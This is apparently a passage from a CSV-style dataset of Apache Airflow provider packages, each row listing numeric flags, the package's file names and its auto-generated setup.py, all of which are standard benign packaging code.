# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-dbt-cloud package.""""""

from setuptools import find_namespace_packages, setup

version = '2.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-dbt-cloud setup.""""""
    setup(
        version=version,
        extras_require={'http': ['apache-airflow-providers-http']},
        packages=find_namespace_packages(
            include=['airflow.providers.dbt.cloud', 'airflow.providers.dbt.cloud.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-docker-3.1.0,0,1,1,1,1,0,0,0,docker.py __init__.py get_provider_info.py docker.py __init__.py docker.py docker_swarm.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-docker package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-docker setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.docker', 'airflow.providers.docker.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-ftp-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py ftp.py __init__.py ftp.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-ftp package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-ftp setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.ftp', 'airflow.providers.ftp.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-google-8.2.0,0,1,1,1,1,0,0,0,ads.py __init__.py ads.py __init__.py ads_to_gcs.py __init__.py __init__.py example_automl_nl_text_classification.py example_automl_nl_text_extraction.py example_automl_nl_text_sentiment.py example_automl_tables.py example_automl_translation.py example_automl_video_intelligence_classification.py example_automl_video_intelligence_tracking.py example_automl_vision_classification.py example_automl_vision_object_detection.py example_bigquery_dts.py example_bigquery_to_bigquery.py example_bigquery_to_mssql.py example_bigtable.py example_cloud_build.py example_cloud_build.yaml example_cloud_composer.py example_cloud_memorystore.py example_cloud_sql_query.py example_cloud_storage_transfer_service_aws.py example_cloud_storage_transfer_service_gcp.py example_compute.py example_compute_igm.py example_compute_ssh.py example_dataflow.py example_dataflow_flex_template.py example_dataflow_sql.py example_datafusion.py example_dataplex.py example_dataprep.py example_dataproc_metastore.py example_dlp.py example_facebook_ads_to_gcs.py example_functions.py example_gcs_to_sftp.py example_gdrive_to_gcs.py example_gdrive_to_local.py example_life_sciences.py example_looker.py example_mlengine.py example_natural_language.py example_postgres_to_gcs.py example_presto_to_gcs.py example_salesforce_to_gcs.py example_sftp_to_gcs.py example_translate.py example_translate_speech.py example_trino_to_gcs.py example_vertex_ai.py example_video_intelligence.py example_vision.py __init__.py automl.py bigquery.py bigquery_dts.py bigtable.py cloud_build.py cloud_composer.py cloud_memorystore.py cloud_sql.py cloud_storage_transfer_service.py compute.py compute_ssh.py datacatalog.py dataflow.py datafusion.py dataplex.py dataprep.py dataproc.py dataproc_metastore.py datastore.py dlp.py functions.py gcs.py gdm.py kms.py kubernetes_engine.py life_sciences.py looker.py mlengine.py natural_language.py os_login.py pubsub.py secret_manager.py spanner.py speech_to_text.py stackdriver.py tasks.py text_to_speech.py translate.py auto_ml.py batch_prediction_job.py custom_job.py dataset.py endpoint_service.py hyperparameter_tuning_job.py model_service.py __init__.py video_intelligence.py vision.py workflows.py __init__.py base.py bigquery.py bigquery_dts.py bigtable.py cloud_sql.py cloud_tasks.py datacatalog.py dataflow.py dataplex.py dataproc.py datastore.py kubernetes_engine.py pubsub.py spanner.py stackdriver.py vertex_ai.py workflows.py __init__.py gcs_task_handler.py stackdriver_task_handler.py __init__.py automl.py bigquery.py bigquery_dts.py bigtable.py cloud_build.py cloud_composer.py cloud_memorystore.py cloud_sql.py cloud_storage_transfer_service.py compute.py datacatalog.py dataflow.py datafusion.py dataplex.py dataprep.py dataproc.py dataproc_metastore.py datastore.py dlp.py functions.py gcs.py kubernetes_engine.py life_sciences.py looker.py mlengine.py natural_language.py pubsub.py spanner.py speech_to_text.py stackdriver.py tasks.py text_to_speech.py translate.py translate_speech.py auto_ml.py batch_prediction_job.py custom_job.py dataset.py endpoint_service.py hyperparameter_tuning_job.py model_service.py __init__.py video_intelligence.py vision.py workflows.py __init__.py secret_manager.py __init__.py bigquery.py bigquery_dts.py bigtable.py cloud_storage_transfer_service.py dataflow.py datafusion.py dataplex.py dataproc.py gcs.py looker.py pubsub.py workflows.py __init__.py adls_to_gcs.py azure_fileshare_to_gcs.py bigquery_to_bigquery.py bigquery_to_gcs.py bigquery_to_mssql.py bigquery_to_mysql.py calendar_to_gcs.py cassandra_to_gcs.py facebook_ads_to_gcs.py gcs_to_bigquery.py gcs_to_gcs.py gcs_to_local.py gcs_to_sftp.py gdrive_to_gcs.py gdrive_to_local.py local_to_gcs.py mssql_to_gcs.py mysql_to_gcs.py oracle_to_gcs.py postgres_to_gcs.py presto_to_gcs.py s3_to_gcs.py salesforce_to_gcs.py sftp_to_gcs.py sheets_to_gcs.py sql_to_gcs.py trino_to_gcs.py __init__.py cloud_composer.py __init__.py bigquery_get_data.py credentials_provider.py field_sanitizer.py field_validator.py helpers.py mlengine_operator_utils.py mlengine_prediction_summary.py __init__.py secret_manager_client.py __init__.py __init__.py google_openid.py __init__.py consts.py base_google.py discovery_api.py __init__.py storage.py __init__.py id_token_credentials.py __init__.py __init__.py __init__.py firestore.py __init__.py firestore.py __init__.py __init__.py get_provider_info.py go_module_utils.py leveldb.py __init__.py leveldb.py __init__.py __init__.py example_analytics.py example_campaign_manager.py example_display_video.py __init__.py analytics.py campaign_manager.py display_video.py search_ads.py __init__.py analytics.py campaign_manager.py display_video.py search_ads.py __init__.py campaign_manager.py display_video.py search_ads.py __init__.py __init__.py example_local_to_drive.py __init__.py calendar.py drive.py sheets.py __init__.py sheets.py __init__.py drive.py __init__.py gcs_to_gdrive.py gcs_to_sheets.py local_to_drive.py sql_to_sheets.py __init__.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-google package.""""""

from setuptools import find_namespace_packages, setup

version = '8.2.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-google setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon>=2.6.0'],
            'apache.beam': ['apache-airflow-providers-apache-beam', 'apache-beam[gcp]'],
            'apache.cassandra': ['apache-airflow-providers-apache-cassandra'],
            'cncf.kubernetes': ['apache-airflow-providers-cncf-kubernetes'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'facebook': ['apache-airflow-providers-facebook>=2.2.0'],
            'microsoft.azure': ['apache-airflow-providers-microsoft-azure'],
            'microsoft.mssql': ['apache-airflow-providers-microsoft-mssql'],
            'mysql': ['apache-airflow-providers-mysql'],
            'oracle': ['apache-airflow-providers-oracle>=3.1.0'],
            'postgres': ['apache-airflow-providers-postgres'],
            'presto': ['apache-airflow-providers-presto'],
            'salesforce': ['apache-airflow-providers-salesforce'],
            'sftp': ['apache-airflow-providers-sftp'],
            'ssh': ['apache-airflow-providers-ssh'],
            'trino': ['apache-airflow-providers-trino'],
            'leveldb': ['plyvel'],
        },
        packages=find_namespace_packages(include=['airflow.providers.google', 'airflow.providers.google.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-http-4.0.0,0,1,1,1,1,0,0,0,get_provider_info.py http.py __init__.py http.py __init__.py http.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-http package.""""""

from setuptools import find_namespace_packages, setup

version = '4.0.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-http setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.http', 'airflow.providers.http.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-imap-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py imap.py __init__.py imap_attachment.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-imap package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-imap setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.imap', 'airflow.providers.imap.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-jdbc-3.2.0,0,1,1,1,1,0,0,0,get_provider_info.py jdbc.py __init__.py jdbc.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-jdbc package.""""""

from setuptools import find_namespace_packages, setup

version = '3.2.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-jdbc setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(include=['airflow.providers.jdbc', 'airflow.providers.jdbc.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-jira-3.0.1,0,1,1,1,1,0,0,0,get_provider_info.py jira.py __init__.py jira.py __init__.py jira.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-jira package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.1'


def do_setup():
    """"""Perform the package apache-airflow-providers-jira setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.jira', 'airflow.providers.jira.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-microsoft-azure-4.2.0,0,1,1,1,1,0,0,0,get_provider_info.py adx.py asb.py azure_batch.py azure_container_instance.py azure_container_registry.py azure_container_volume.py azure_cosmos.py azure_data_factory.py azure_data_lake.py azure_fileshare.py base_azure.py batch.py container_instance.py container_registry.py container_volume.py cosmos.py data_factory.py data_lake.py fileshare.py wasb.py __init__.py wasb_task_handler.py __init__.py adls.py adls_delete.py adls_list.py adx.py asb.py azure_batch.py azure_container_instances.py azure_cosmos.py batch.py container_instances.py cosmos.py data_factory.py wasb_delete_blob.py __init__.py azure_key_vault.py key_vault.py __init__.py azure_cosmos.py cosmos.py data_factory.py wasb.py __init__.py azure_blob_to_gcs.py file_to_wasb.py local_to_adls.py local_to_wasb.py oracle_to_azure_data_lake.py sftp_to_wasb.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-microsoft-azure package.""""""

from setuptools import find_namespace_packages, setup

version = '4.2.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-microsoft-azure setup.""""""
    setup(
        version=version,
        extras_require={
            'google': ['apache-airflow-providers-google'],
            'oracle': ['apache-airflow-providers-oracle'],
            'sftp': ['apache-airflow-providers-sftp'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.microsoft.azure', 'airflow.providers.microsoft.azure.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-microsoft-mssql-3.2.0,0,1,1,1,1,0,0,0,get_provider_info.py mssql.py __init__.py mssql.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-microsoft-mssql package.""""""

from setuptools import find_namespace_packages, setup

version = '3.2.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-microsoft-mssql setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(
            include=['airflow.providers.microsoft.mssql', 'airflow.providers.microsoft.mssql.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-mongo-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py mongo.py __init__.py mongo.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-mongo package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-mongo setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.mongo', 'airflow.providers.mongo.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-mysql-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py mysql.py __init__.py mysql.py __init__.py presto_to_mysql.py s3_to_mysql.py trino_to_mysql.py vertica_to_mysql.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-mysql package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-mysql setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'presto': ['apache-airflow-providers-presto'],
            'trino': ['apache-airflow-providers-trino'],
            'vertica': ['apache-airflow-providers-vertica'],
        },
        packages=find_namespace_packages(include=['airflow.providers.mysql', 'airflow.providers.mysql.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-odbc-3.1.1,0,1,1,1,1,0,0,0,get_provider_info.py odbc.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-odbc package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.1'

def do_setup():
    """"""Perform the package apache-airflow-providers-odbc setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(include=['airflow.providers.odbc', 'airflow.providers.odbc.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-oracle-3.3.0,0,1,1,1,1,0,0,0,get_provider_info.py oracle.py __init__.py oracle.py __init__.py oracle_to_oracle.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-oracle package.""""""

from setuptools import find_namespace_packages, setup

version = '3.3.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-oracle setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql'], 'numpy': ['numpy']},
        packages=find_namespace_packages(include=['airflow.providers.oracle', 'airflow.providers.oracle.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-pagerduty-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py pagerduty.py pagerduty_events.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-pagerduty package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-pagerduty setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.pagerduty', 'airflow.providers.pagerduty.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-papermill-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py papermill.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
